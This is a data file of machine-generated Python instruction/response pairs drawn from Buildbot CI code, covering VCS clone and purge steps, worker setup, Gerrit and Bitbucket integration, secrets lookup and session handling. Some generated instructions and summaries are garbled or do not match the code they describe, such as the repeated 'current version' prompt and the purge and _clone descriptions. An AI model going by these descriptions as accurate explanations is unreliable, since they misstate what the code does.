{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndelete everything that shown up on status.", "response": "def purge(self, ignore_ignores):\n        \"\"\"Delete everything that shown up on status.\"\"\"\n        command = ['status', '--xml']\n        if ignore_ignores:\n            command.append('--no-ignore')\n        d = self._dovccmd(command, collectStdout=True)\n\n        @d.addCallback\n        def parseAndRemove(stdout):\n            files = []\n            for filename in self.getUnversionedFiles(stdout, self.keep_on_purge):\n                filename = self.build.path_module.join(self.workdir, filename)\n                files.append(filename)\n            if not files:\n                d = defer.succeed(0)\n            else:\n                if self.workerVersionIsOlderThan('rmdir', '2.14'):\n                    d = self.removeFiles(files)\n                else:\n                    d = self.runRmdir(files, abandonOnFailure=False, timeout=self.timeout)\n            return d\n\n        @d.addCallback\n        def evaluateCommand(rc):\n            if rc != 0:\n                log.msg(\"Failed removing files\")\n                raise buildstep.BuildStepFailed()\n            return rc\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking if the given directory is a worker or a master and returns the appropriate run function.", "response": "def DetermineRunner(bbdir):\n    '''Checks if the given directory is a worker or a master and returns the\n    appropriate run function.'''\n    tacfile = os.path.join(bbdir, 'buildbot.tac')\n    if not os.path.exists(tacfile):\n        # No tac-file - use master runner by default.\n        import buildbot.scripts.runner\n        return buildbot.scripts.runner.run\n\n    with open(tacfile, 'r') as f:\n        contents = f.read()\n\n    try:\n        if 'import Worker' in contents:\n            import buildbot_worker.scripts.runner\n            return buildbot_worker.scripts.runner.run\n\n    except ImportError:\n        # Not a worker.\n        pass\n\n    try:\n        if 'import BuildSlave' in contents:\n            import buildslave.scripts.runner\n            return buildslave.scripts.runner.run\n\n    except ImportError:\n        # Not an old buildslave.\n        pass\n\n    # Treat as master by default.\n    import buildbot.scripts.runner\n    return buildbot.scripts.runner.run"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef purge(self, ignore_ignores):\n        command = ['sync', '#none']\n        if ignore_ignores:\n            command.append('--no-ignore')\n        d = self._dovccmd(command, collectStdout=True)\n\n        # add deferred to rm tree\n\n        # then add defer to sync to revision\n        return d", "response": "Delete everything that shown up on status."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef filterManifestPatches(self):\n        manifest_unrelated_downloads = []\n        manifest_related_downloads = []\n        for download in self.repoDownloads:\n            project, ch_ps = download.split(\" \")[-2:]\n            if (self.manifestURL.endswith(\"/\" + project) or\n                    self.manifestURL.endswith(\"/\" + project + \".git\")):\n                ch, ps = map(int, ch_ps.split(\"/\"))\n                branch = \"refs/changes/%02d/%d/%d\" % (ch % 100, ch, ps)\n                manifest_related_downloads.append(\n                    [\"git\", \"fetch\", self.manifestURL, branch])\n                manifest_related_downloads.append(\n                    [\"git\", \"cherry-pick\", \"FETCH_HEAD\"])\n            else:\n                manifest_unrelated_downloads.append(download)\n        self.repoDownloads = manifest_unrelated_downloads\n        self.manifestDownloads = manifest_related_downloads", "response": "Filter out manifest patches that are related to other projects."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a command that will be run when the user does not want to delete the current version of the current version of the current version of the version of the version.", "response": "def _getCleanupCommand(self):\n        \"\"\"also used by tests for expectations\"\"\"\n        return textwrap.dedent(\"\"\"\\\n            set -v\n            if [ -d .repo/manifests ]\n            then\n                # repo just refuse to run if manifest is messed up\n                # so ensure we are in a known state\n                cd .repo/manifests\n                rm -f .git/index.lock\n                git fetch origin\n                git reset --hard remotes/origin/%(manifestBranch)s\n                git config branch.default.merge %(manifestBranch)s\n                cd ..\n                ln -sf manifests/%(manifestFile)s manifest.xml\n                cd ..\n             fi\n             repo forall -c rm -f .git/index.lock\n             repo forall -c git clean -f -d -x 2>/dev/null\n             repo forall -c git reset --hard HEAD 2>/dev/null\n             rm -f %(workdir)s/.repo/project.list\n             \"\"\") % dict(manifestBranch=self.manifestBranch,\n                         manifestFile=self.manifestFile,\n                         workdir=self.workdir)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the object id for this master for associating state with the master.", "response": "def getObjectId(self):\n        \"\"\"\n        Return the object id for this master, for associating state with the\n        master.\n\n        @returns: ID, via Deferred\n        \"\"\"\n        # try to get the cached value\n        if self._object_id is not None:\n            return defer.succeed(self._object_id)\n\n        # failing that, get it from the DB; multiple calls to this function\n        # at the same time will not hurt\n\n        d = self.db.state.getObjectId(self.name,\n                                      \"buildbot.master.BuildMaster\")\n\n        @d.addCallback\n        def keep(id):\n            self._object_id = id\n            return id\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _setState(self, name, value):\n        \"private wrapper around C{self.db.state.setState}\"\n        d = self.getObjectId()\n\n        @d.addCallback\n        def set(objectid):\n            return self.db.state.setState(objectid, name, value)\n        return d", "response": "private wrapper around C { self. db. state. setState }"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef createUserObject(master, author, src=None):\n\n    if not src:\n        log.msg(\"No vcs information found, unable to create User Object\")\n        return defer.succeed(None)\n\n    if src in srcs:\n        usdict = dict(identifier=author, attr_type=src, attr_data=author)\n    else:\n        log.msg(\"Unrecognized source argument: %s\" % src)\n        return defer.succeed(None)\n\n    return master.db.users.findUserByAttr(\n        identifier=usdict['identifier'],\n        attr_type=usdict['attr_type'],\n        attr_data=usdict['attr_data'])", "response": "Create a User Object from a Change author and source and return the User Object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nencrypt the incoming password after adding some salt to store it in the database.", "response": "def encrypt(passwd):\n    \"\"\"\n    Encrypts the incoming password after adding some salt to store\n    it in the database.\n\n    @param passwd: password portion of user credentials\n    @type passwd: string\n\n    @returns: encrypted/salted string\n    \"\"\"\n    m = sha1()\n    salt = hexlify(os.urandom(salt_len))\n    m.update(unicode2bytes(passwd) + salt)\n    crypted = bytes2unicode(salt) + m.hexdigest()\n    return crypted"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ntest to see if the given password is the same as the given password from the database.", "response": "def check_passwd(guess, passwd):\n    \"\"\"\n    Tests to see if the guess, after salting and hashing, matches the\n    passwd from the database.\n\n    @param guess: incoming password trying to be used for authentication\n    @param passwd: already encrypted password from the database\n\n    @returns: boolean\n    \"\"\"\n    m = sha1()\n    salt = passwd[:salt_len * 2]  # salt_len * 2 due to encode('hex_codec')\n    m.update(unicode2bytes(guess) + unicode2bytes(salt))\n    crypted_guess = bytes2unicode(salt) + m.hexdigest()\n\n    return (crypted_guess == bytes2unicode(passwd))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the url to redirect the user to for user consent", "response": "def getLoginURL(self, redirect_url):\n        \"\"\"\n        Returns the url to redirect the user to for user consent\n        \"\"\"\n        p = Properties()\n        p.master = self.master\n        clientId = yield p.render(self.clientId)\n        oauth_params = {'redirect_uri': self.loginUri,\n                        'client_id': clientId, 'response_type': 'code'}\n        if redirect_url is not None:\n            oauth_params['state'] = urlencode(dict(redirect=redirect_url))\n        oauth_params.update(self.authUriAdditionalParams)\n        sorted_oauth_params = sorted(oauth_params.items(), key=lambda val: val[0])\n        return \"%s?%s\" % (self.authUri, urlencode(sorted_oauth_params))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _handleLegacyResult(result):\n    if not isinstance(result, dict):\n        warnings.warn('The Gerrit status callback uses the old way to '\n                      'communicate results.  The outcome might be not what is '\n                      'expected.')\n        message, verified, reviewed = result\n        result = makeReviewResult(message,\n                                  (GERRIT_LABEL_VERIFIED, verified),\n                                  (GERRIT_LABEL_REVIEWED, reviewed))\n    return result", "response": "Handle legacy Gerrit status callback results."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconstructs a command as a list of strings suitable for gerrit.", "response": "def _gerritCmd(self, *args):\n        '''Construct a command as a list of strings suitable for\n        :func:`subprocess.call`.\n        '''\n        if self.gerrit_identity_file is not None:\n            options = ['-i', self.gerrit_identity_file]\n        else:\n            options = []\n        return ['ssh'] + options + [\n            '@'.join((self.gerrit_username, self.gerrit_server)),\n            '-p', str(self.gerrit_port),\n            'gerrit'\n        ] + list(args)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ntrying to start any builds that can be started right now. This function returns immediately, and promises to trigger those builders eventually. @param new_builders: names of new builders that should be given the opportunity to check for new requests.", "response": "def maybeStartBuildsOn(self, new_builders):\n        \"\"\"\n        Try to start any builds that can be started right now.  This function\n        returns immediately, and promises to trigger those builders\n        eventually.\n\n        @param new_builders: names of new builders that should be given the\n        opportunity to check for new requests.\n        \"\"\"\n        if not self.running:\n            return\n\n        d = self._maybeStartBuildsOn(new_builders)\n        self._pendingMSBOCalls.append(d)\n\n        try:\n            yield d\n        except Exception as e:  # pragma: no cover\n            log.err(e, \"while starting builds on {0}\".format(new_builders))\n        finally:\n            self._pendingMSBOCalls.remove(d)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef runRmdir(self, dir, timeout=None, **kwargs):\n        cmd_args = {'dir': dir, 'logEnviron': self.logEnviron}\n        if timeout:\n            cmd_args['timeout'] = timeout\n        return self.runRemoteCommand('rmdir', cmd_args, **kwargs)", "response": "remove a directory from the worker"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef runRmFile(self, path, timeout=None, **kwargs):\n        cmd_args = {'path': path, 'logEnviron': self.logEnviron}\n        if timeout:\n            cmd_args['timeout'] = timeout\n        if self.workerVersionIsOlderThan('rmfile', '3.1'):\n            cmd_args['dir'] = os.path.abspath(path)\n            return self.runRemoteCommand('rmdir', cmd_args, **kwargs)\n        return self.runRemoteCommand('rmfile', cmd_args, **kwargs)", "response": "remove a file from the worker"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ntest whether path exists", "response": "def pathExists(self, path):\n        \"\"\" test whether path exists\"\"\"\n        def commandComplete(cmd):\n            return not cmd.didFail()\n\n        return self.runRemoteCommand('stat', {'file': path,\n                                              'logEnviron': self.logEnviron, },\n                                     abandonOnFailure=False,\n                                     evaluateCommand=commandComplete)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a directory and its parents", "response": "def runMkdir(self, _dir, **kwargs):\n        \"\"\" create a directory and its parents\"\"\"\n        return self.runRemoteCommand('mkdir', {'dir': _dir,\n                                               'logEnviron': self.logEnviron, },\n                                     **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef runGlob(self, path, **kwargs):\n        def commandComplete(cmd):\n            return cmd.updates['files'][-1]\n\n        return self.runRemoteCommand('glob', {'path': path,\n                                              'logEnviron': self.logEnviron, },\n                                     evaluateCommand=commandComplete, **kwargs)", "response": "find files matching a shell - style pattern"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns old API name for new name.", "response": "def _compat_name(new_name, compat_name=None):\n    \"\"\"Returns old API (\"slave\") name for new name (\"worker\").\n\n    >>> assert _compat_name(\"Worker\") == \"Slave\"\n    >>> assert _compat_name(\"SomeWorkerStuff\") == \"SomeSlaveStuff\"\n    >>> assert _compat_name(\"SomeWorker\", compat_name=\"SomeBuildSlave\") == \\\n        \"SomeBuildSlave\"\n\n    If `compat_name` is not specified old name is construct by replacing in\n    `new_name`:\n        \"worker\" -> \"slave\",\n        \"Worker\" -> \"Slave\".\n\n    For the sake of simplicity of usage if `compat_name` argument is specified\n    it will returned as the result.\n    \"\"\"\n\n    if compat_name is not None:\n        assert \"slave\" in compat_name.lower()\n        assert new_name == \"\" or \"worker\" in new_name.lower(), new_name\n        return compat_name\n\n    compat_replacements = {\n        \"worker\": \"slave\",\n        \"Worker\": \"Slave\",\n    }\n\n    compat_name = new_name\n    assert \"slave\" not in compat_name.lower()\n    assert \"worker\" in compat_name.lower()\n    for new_word, old_word in compat_replacements.items():\n        compat_name = compat_name.replace(new_word, old_word)\n\n    assert compat_name != new_name\n    assert \"slave\" in compat_name.lower()\n    assert \"worker\" not in compat_name.lower()\n\n    return compat_name"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef reportDeprecatedWorkerNameUsage(message, stacklevel=None, filename=None,\n                                    lineno=None):\n    \"\"\"Hook that is ran when old API name is used.\n\n    :param stacklevel: stack level relative to the caller's frame.\n    Defaults to caller of the caller of this function.\n    \"\"\"\n\n    if filename is None:\n        if stacklevel is None:\n            # Warning will refer to the caller of the caller of this function.\n            stacklevel = 3\n        else:\n            stacklevel += 2\n\n        warnings.warn(DeprecatedWorkerNameWarning(message), None, stacklevel)\n\n    else:\n        assert stacklevel is None\n\n        if lineno is None:\n            lineno = 0\n\n        warnings.warn_explicit(\n            DeprecatedWorkerNameWarning(message),\n            DeprecatedWorkerNameWarning,\n            filename, lineno)", "response": "Hook that is ran when old API name is used."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef setupWorkerTransition():\n\n    default_warn_method = getWarningMethod()\n\n    def custom_warn_method(message, category, stacklevel):\n        if stacklevel is not None:\n            stacklevel += 1\n        if _WORKER_WARNING_MARK in message:\n            # Message contains our mark - it's Worker API Renaming warning,\n            # issue it appropriately.\n            message = message.replace(_WORKER_WARNING_MARK, \"\")\n            warnings.warn(\n                DeprecatedWorkerNameWarning(message), message, stacklevel)\n        else:\n            # Other's warning message\n            default_warn_method(message, category, stacklevel)\n\n    setWarningMethod(custom_warn_method)", "response": "Hook Twisted deprecation machinery to use custom warning class\n            for Worker API deprecation warnings."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _fetchOrFallback(self, _=None):\n        res = yield self._fetch(None)\n        if res == RC_SUCCESS:\n            return res\n        elif self.retryFetch:\n            yield self._fetch(None)\n        elif self.clobberOnFailure:\n            yield self.clobber()\n        else:\n            raise buildstep.BuildStepFailed()", "response": "Handles fetch failure of fetch and fallback for failure of fetch"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndoing a shallow clone of the current object.", "response": "def _clone(self, shallowClone):\n        \"\"\"Retry if clone failed\"\"\"\n\n        command = ['clone']\n        switchToBranch = False\n        if self.supportsBranch and self.branch != 'HEAD':\n            if self.branch.startswith('refs/'):\n                # we can't choose this branch from 'git clone' directly; we\n                # must do so after the clone\n                switchToBranch = True\n                command += ['--no-checkout']\n            else:\n                command += ['--branch', self.branch]\n        if shallowClone:\n            command += ['--depth', str(int(shallowClone))]\n        if self.reference:\n            command += ['--reference', self.reference]\n        if self.origin:\n            command += ['--origin', self.origin]\n        command += [self.repourl, '.']\n\n        if self.prog:\n            command.append('--progress')\n        if self.retry:\n            abandonOnFailure = (self.retry[1] <= 0)\n        else:\n            abandonOnFailure = True\n        # If it's a shallow clone abort build step\n        res = yield self._dovccmd(command, abandonOnFailure=(abandonOnFailure and shallowClone))\n\n        if switchToBranch:\n            res = yield self._fetch(None)\n\n        done = self.stopped or res == RC_SUCCESS  # or shallow clone??\n        if self.retry and not done:\n            delay, repeats = self.retry\n            if repeats > 0:\n                log.msg(\"Checkout failed, trying %d more times after %d seconds\"\n                        % (repeats, delay))\n                self.retry = (delay, repeats - 1)\n\n                df = defer.Deferred()\n                df.addCallback(lambda _: self._doClobber())\n                df.addCallback(lambda _: self._clone(shallowClone))\n                reactor.callLater(delay, df.callback, None)\n                res = yield df\n\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _fullClone(self, shallowClone=False):\n        res = yield self._clone(shallowClone)\n        if res != RC_SUCCESS:\n            return res\n\n        # If revision specified checkout that revision\n        if self.revision:\n            res = yield self._dovccmd(['reset', '--hard',\n                                       self.revision, '--'],\n                                      shallowClone)\n        # init and update submodules, recursively. If there's not recursion\n        # it will not do it.\n        if self.submodules:\n            res = yield self._dovccmd(['submodule', 'update',\n                                       '--init', '--recursive'],\n                                      shallowClone)\n\n        return res", "response": "Perform full clone and checkout to the revision if specified."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwrapping for _fullClone(). In the case of failure, if clobberOnFailure is set to True remove the build directory and try a full clone again.", "response": "def _fullCloneOrFallback(self):\n        \"\"\"Wrapper for _fullClone(). In the case of failure, if clobberOnFailure\n           is set to True remove the build directory and try a full clone again.\n        \"\"\"\n\n        res = yield self._fullClone()\n        if res != RC_SUCCESS:\n            if not self.clobberOnFailure:\n                raise buildstep.BuildStepFailed()\n            res = yield self.clobber()\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _doClobber(self):\n        rc = yield self.runRmdir(self.workdir, timeout=self.timeout)\n        if rc != RC_SUCCESS:\n            raise RuntimeError(\"Failed to delete directory\")\n        return rc", "response": "Remove the work directory and return the rc"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncatch a POST request from BitBucket and start a build process", "response": "def getChanges(self, request):\n        \"\"\"Catch a POST request from BitBucket and start a build process\n\n        Check the URL below if you require more information about payload\n        https://confluence.atlassian.com/display/BITBUCKET/POST+Service+Management\n\n        :param request: the http request Twisted object\n        :param options: additional options\n        \"\"\"\n\n        event_type = request.getHeader(_HEADER_EVENT)\n        event_type = bytes2unicode(event_type)\n        payload = json.loads(bytes2unicode(request.args[b'payload'][0]))\n        repo_url = '{}{}'.format(\n            payload['canon_url'], payload['repository']['absolute_url'])\n        project = request.args.get(b'project', [b''])[0]\n        project = bytes2unicode(project)\n\n        changes = []\n        for commit in payload['commits']:\n            changes.append({\n                'author': commit['raw_author'],\n                'files': [f['file'] for f in commit['files']],\n                'comments': commit['message'],\n                'revision': commit['raw_node'],\n                'when_timestamp': dateparse(commit['utctimestamp']),\n                'branch': commit['branch'],\n                'revlink': '{}commits/{}'.format(repo_url, commit['raw_node']),\n                'repository': repo_url,\n                'project': project,\n                'properties': {\n                    'event': event_type,\n                },\n            })\n            log.msg('New revision: {}'.format(commit['node']))\n\n        log.msg('Received {} changes from bitbucket'.format(len(changes)))\n        return (changes, payload['repository']['scm'])"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self, entry):\n        if self.apiVersion == 1:\n            path = self.secretsmount + '/' + entry\n        else:\n            path = self.secretsmount + '/data/' + entry\n\n        # note that the HTTP path contains v1 for both versions of the key-value\n        # secret engine. Different versions of the key-value engine are\n        # effectively separate secret engines in vault, with the same base HTTP\n        # API, but with different paths within it.\n        proj = yield self._http.get('/v1/{0}'.format(path))\n        code = yield proj.code\n        if code != 200:\n            raise KeyError(\"The key %s does not exist in Vault provider: request\"\n                           \" return code:%d.\" % (entry, code))\n        json = yield proj.json()\n        if self.apiVersion == 1:\n            ret = json.get('data', {}).get('value')\n        else:\n            ret = json.get('data', {}).get('data', {}).get('value')\n        return ret", "response": "Get the value of a key from vault secret backend"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef createStatus(self,\n                     change_id,\n                     revision_id,\n                     name,\n                     value,\n                     abstain=None,\n                     rerun=None,\n                     comment=None,\n                     url=None,\n                     reporter=None,\n                     category=None,\n                     duration=None):\n        \"\"\"\n        Abstract the POST REST api documented here:\n        https://gerrit.googlesource.com/plugins/verify-status/+/master/src/main/resources/Documentation/rest-api-changes.md\n\n        :param change_id: The change_id for the change tested (can be in the long form e.g:\n            myProject~master~I8473b95934b5732ac55d26311a706c9c2bde9940 or in the short integer form).\n        :param revision_id: the revision_id tested can be the patchset number or\n            the commit id (short or long).\n        :param name: The name of the job.\n        :param value: The pass/fail result for this job: -1: fail 0: unstable, 1: succeed\n        :param abstain: Whether the value counts as a vote (defaults to false)\n        :param rerun: Whether this result is from a re-test on the same patchset\n        :param comment: A short comment about this job\n        :param url: The url link to more info about this job\n        :reporter: The user that verified this job\n        :category: A category for this job\n        \"duration\": The time it took to run this job\n\n        :return: A deferred with the result from Gerrit.\n        \"\"\"\n        payload = {'name': name, 'value': value}\n\n        if abstain is not None:\n            payload['abstain'] = abstain\n\n        if rerun is not None:\n            payload['rerun'] = rerun\n\n        if comment is not None:\n            payload['comment'] = comment\n\n        if url is not None:\n            payload['url'] = url\n\n        if reporter is not None:\n            payload['reporter'] = reporter\n\n        if category is not None:\n            payload['category'] = category\n\n        if duration is not None:\n            payload['duration'] = duration\n\n        if self._verbose:\n            log.debug(\n                'Sending Gerrit status for {change_id}/{revision_id}: data={data}',\n                change_id=change_id,\n                revision_id=revision_id,\n                data=payload)\n\n        return self._http.post(\n            '/'.join([\n                '/a/changes', str(change_id), 'revisions', str(revision_id),\n                'verify-status~verifications'\n            ]),\n            json=payload)", "response": "Create a status object for a specific job."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nformat the duration in gerrit", "response": "def formatDuration(self, duration):\n        \"\"\"Format the duration.\n\n        This method could be overridden if really needed, as the duration format in gerrit\n        is an arbitrary string.\n        :param duration: duration in timedelta\n        \"\"\"\n        days = duration.days\n        hours, remainder = divmod(duration.seconds, 3600)\n        minutes, seconds = divmod(remainder, 60)\n        if days:\n            return '{} day{} {}h {}m {}s'.format(days, \"s\" if days > 1 else \"\",\n                                                 hours, minutes, seconds)\n        elif hours:\n            return '{}h {}m {}s'.format(hours, minutes, seconds)\n        return '{}m {}s'.format(minutes, seconds)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef getGerritChanges(props):\n        if 'gerrit_changes' in props:\n            return props.getProperty('gerrit_changes')\n\n        if 'event.change.number' in props:\n            return [{\n                'change_id': props.getProperty('event.change.number'),\n                'revision_id': props.getProperty('event.patchSet.number')\n            }]\n        return []", "response": "Get the gerrit changes for a specific object"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef DetermineRunner(bbdir):\n    '''Checks if the given directory is a buildbot worker or a master and\n    returns the appropriate run function.'''\n    try:\n        import buildbot_worker.scripts.runner\n        tacfile = os.path.join(bbdir, 'buildbot.tac')\n\n        if os.path.exists(tacfile):\n            with open(tacfile, 'r') as f:\n                contents = f.read()\n                if 'import Worker' in contents:\n                    return buildbot_worker.scripts.runner.run\n\n    except ImportError:\n        # Use the default\n        pass\n\n    import buildbot.scripts.runner\n    return buildbot.scripts.runner.run", "response": "Checks if the given directory is a buildbot worker or a master and\n    returns the appropriate run function."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _splitBigChunk(self, content, logid):\n        # if it's small enough, just return it\n        if len(content) < self.MAX_CHUNK_SIZE:\n            return content, None\n\n        # find the last newline before the limit\n        i = content.rfind(b'\\n', 0, self.MAX_CHUNK_SIZE)\n        if i != -1:\n            return content[:i], content[i + 1:]\n\n        log.msg('truncating long line for log %d' % logid)\n\n        # first, truncate this down to something that decodes correctly\n        truncline = content[:self.MAX_CHUNK_SIZE]\n        while truncline:\n            try:\n                truncline.decode('utf-8')\n                break\n            except UnicodeDecodeError:\n                truncline = truncline[:-1]\n\n        # then find the beginning of the next line\n        i = content.find(b'\\n', self.MAX_CHUNK_SIZE)\n        if i == -1:\n            return truncline, None\n        return truncline, content[i + 1:]", "response": "Split the content into smaller than self. MAX_CHUNK_SIZE and return the remainder of the next line."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef updateSession(self, request):\n        # we actually need to copy some hardcoded constants from twisted :-(\n\n        # Make sure we aren't creating a secure session on a non-secure page\n        secure = request.isSecure()\n\n        if not secure:\n            cookieString = b\"TWISTED_SESSION\"\n        else:\n            cookieString = b\"TWISTED_SECURE_SESSION\"\n\n        cookiename = b\"_\".join([cookieString] + request.sitepath)\n        request.addCookie(cookiename, self.uid, path=b\"/\",\n                          secure=secure)", "response": "Update the cookie after the session object was modified."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the uid of the current user", "response": "def uid(self):\n        \"\"\"uid is now generated automatically according to the claims.\n\n        This should actually only be used for cookie generation\n        \"\"\"\n        exp = datetime.datetime.utcnow() + self.expDelay\n        claims = {\n            'user_info': self.user_info,\n            # Note that we use JWT standard 'exp' field to implement session expiration\n            # we completely bypass twisted.web session expiration mechanisms\n            'exp': calendar.timegm(datetime.datetime.timetuple(exp))}\n\n        return jwt.encode(claims, self.site.session_secret, algorithm=SESSION_SECRET_ALGORITHM)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmakes base directory if needed.", "response": "def _makeBaseDir(basedir, quiet):\n    \"\"\"\n    Make worker base directory if needed.\n\n    @param basedir: worker base directory relative path\n    @param   quiet: if True, don't print info messages\n\n    @raise CreateWorkerError: on error making base directory\n    \"\"\"\n    if os.path.exists(basedir):\n        if not quiet:\n            print(\"updating existing installation\")\n        return\n\n    if not quiet:\n        print(\"mkdir\", basedir)\n\n    try:\n        os.mkdir(basedir)\n    except OSError as exception:\n        raise CreateWorkerError(\"error creating directory {0}: {1}\".format(\n                                basedir, exception.strerror))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _makeBuildbotTac(basedir, tac_file_contents, quiet):\n    tacfile = os.path.join(basedir, \"buildbot.tac\")\n\n    if os.path.exists(tacfile):\n        try:\n            with open(tacfile, \"rt\") as f:\n                oldcontents = f.read()\n        except IOError as exception:\n            raise CreateWorkerError(\"error reading {0}: {1}\".format(\n                                    tacfile, exception.strerror))\n\n        if oldcontents == tac_file_contents:\n            if not quiet:\n                print(\"buildbot.tac already exists and is correct\")\n            return\n\n        if not quiet:\n            print(\"not touching existing buildbot.tac\")\n            print(\"creating buildbot.tac.new instead\")\n\n        tacfile = os.path.join(basedir, \"buildbot.tac.new\")\n\n    try:\n        with open(tacfile, \"wt\") as f:\n            f.write(tac_file_contents)\n        os.chmod(tacfile, 0o600)\n    except IOError as exception:\n        raise CreateWorkerError(\"could not write {0}: {1}\".format(\n                                tacfile, exception.strerror))", "response": "Create buildbot. tac file. If buildbot. tac file already exists with\n    different contents create buildbot. tac. new instead."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates info files inside a worker base directory.", "response": "def _makeInfoFiles(basedir, quiet):\n    \"\"\"\n    Create info/* files inside basedir.\n\n    @param basedir: worker base directory relative path\n    @param   quiet: if True, don't print info messages\n\n    @raise CreateWorkerError: on error making info directory or\n                             writing info files\n    \"\"\"\n    def createFile(path, file, contents):\n        filepath = os.path.join(path, file)\n\n        if os.path.exists(filepath):\n            return False\n\n        if not quiet:\n            print(\"Creating {0}, you need to edit it appropriately.\".format(\n                  os.path.join(\"info\", file)))\n\n        try:\n            open(filepath, \"wt\").write(contents)\n        except IOError as exception:\n            raise CreateWorkerError(\"could not write {0}: {1}\".format(\n                                    filepath, exception.strerror))\n        return True\n\n    path = os.path.join(basedir, \"info\")\n    if not os.path.exists(path):\n        if not quiet:\n            print(\"mkdir\", path)\n        try:\n            os.mkdir(path)\n        except OSError as exception:\n            raise CreateWorkerError(\"error creating directory {0}: {1}\".format(\n                                    path, exception.strerror))\n\n    # create 'info/admin' file\n    created = createFile(path, \"admin\",\n                         \"Your Name Here <admin@youraddress.invalid>\\n\")\n\n    # create 'info/host' file\n    created = createFile(path, \"host\",\n                         \"Please put a description of this build host here\\n\")\n\n    access_uri = os.path.join(path, \"access_uri\")\n\n    if not os.path.exists(access_uri):\n        if not quiet:\n            print(\"Not creating {0} - add it if you wish\".format(\n                  os.path.join(\"info\", \"access_uri\")))\n\n    if created and not quiet:\n        print(\"Please edit the files in {0} appropriately.\".format(path))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_owner_and_repo(repourl):\n        parsed = urlparse(repourl)\n\n        if parsed.scheme:\n            path = parsed.path[1:]\n        else:\n            # we assume git@host:owner/repo.git here\n            path = parsed.path.split(':', 1)[-1]\n\n        if path.endswith('.git'):\n            path = path[:-4]\n        while path.endswith('/'):\n            path = path[:-1]\n\n        parts = path.split('/')\n\n        assert len(parts) == 2, 'OWNER/REPONAME is expected'\n\n        return parts", "response": "Takes a git repository URL and tries to determine the owner and repository name of the repository."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\npruning all changes older than the given changeHorizon.", "response": "def pruneChanges(self, changeHorizon):\n        \"\"\"\n        Called periodically by DBConnector, this method deletes changes older\n        than C{changeHorizon}.\n        \"\"\"\n\n        if not changeHorizon:\n            return None\n\n        def thd(conn):\n            changes_tbl = self.db.model.changes\n\n            # First, get the list of changes to delete.  This could be written\n            # as a subquery but then that subquery would be run for every\n            # table, which is very inefficient; also, MySQL's subquery support\n            # leaves much to be desired, and doesn't support this particular\n            # form.\n            q = sa.select([changes_tbl.c.changeid],\n                          order_by=[sa.desc(changes_tbl.c.changeid)],\n                          offset=changeHorizon)\n            res = conn.execute(q)\n            ids_to_delete = [r.changeid for r in res]\n\n            # and delete from all relevant tables, in dependency order\n            for table_name in ('scheduler_changes', 'change_files',\n                               'change_properties', 'changes', 'change_users'):\n                remaining = ids_to_delete[:]\n                while remaining:\n                    batch, remaining = remaining[:100], remaining[100:]\n                    table = self.db.model.metadata.tables[table_name]\n                    conn.execute(\n                        table.delete(table.c.changeid.in_(batch)))\n        yield self.db.pool.do(thd)"}
